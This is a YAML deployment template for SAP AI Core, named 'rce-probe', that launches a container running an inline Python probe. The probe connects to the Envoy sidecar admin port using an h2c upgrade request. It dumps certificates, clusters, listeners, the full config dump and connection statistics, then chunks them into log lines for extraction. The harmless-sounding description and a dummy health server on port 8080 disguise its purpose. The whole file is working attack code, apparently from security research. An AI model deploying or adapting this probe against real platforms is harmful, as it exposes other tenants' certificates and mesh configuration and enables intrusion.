apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.5.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "envoy-compact-clusters-config-dump"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import socket

            print('[PROBE_V45_START]', flush=True)

            def envoy_admin(path, timeout=20):
                try:
                    s = socket.socket()
                    s.settimeout(timeout)
                    s.connect(('127.0.0.1', 15000))
                    req = (
                        f'GET {path} HTTP/1.1\r\n'
                        'Host: 127.0.0.1\r\n'
                        'Connection: Upgrade, HTTP2-Settings\r\n'
                        'Upgrade: h2c\r\n'
                        'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
                        'Connection: close\r\n\r\n'
                    )
                    s.sendall(req.encode())
                    chunks = []
                    while True:
                        c = s.recv(65536)
                        if not c: break
                        chunks.append(c)
                    s.close()
                    return b''.join(chunks).decode(errors='replace')
                except Exception as e:
                    return f'ERR:{e}'

            def emit(label, data, chunk=90000):
                # Collapse newlines so each chunk is ONE log line
                flat = data.replace('\r\n', '\n').replace('\r', '\n')
                flat = flat.replace('\n', '|')
                total = len(flat)
                for i in range(0, max(1, total), chunk):
                    seg = flat[i:i+chunk]
                    print(f'[{label}_{i}/{total}] {seg}', flush=True)

            # 1. /certs
            emit('CERTS', envoy_admin('/certs'))

            # 2. /clusters
            emit('CLUSTERS', envoy_admin('/clusters'))

            # 3. /listeners
            emit('LISTENERS', envoy_admin('/listeners'))

            # 4. /config_dump (full, chunked at 90KB)
            emit('CFGDUMP', envoy_admin('/config_dump', timeout=30))

            # 5. /stats filtered
            resp = envoy_admin('/stats')
            lines = [l for l in resp.split('\n')
                     if any(k in l for k in ['upstream_cx', 'upstream_rq',
                                              'ssl.handshake', 'ssl.fail',
                                              'ssl.connection_error',
                                              'cluster_manager',
                                              'server.'])]
            emit('STATS', '\n'.join(lines[:300]))

            print('[PROBE_V45_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
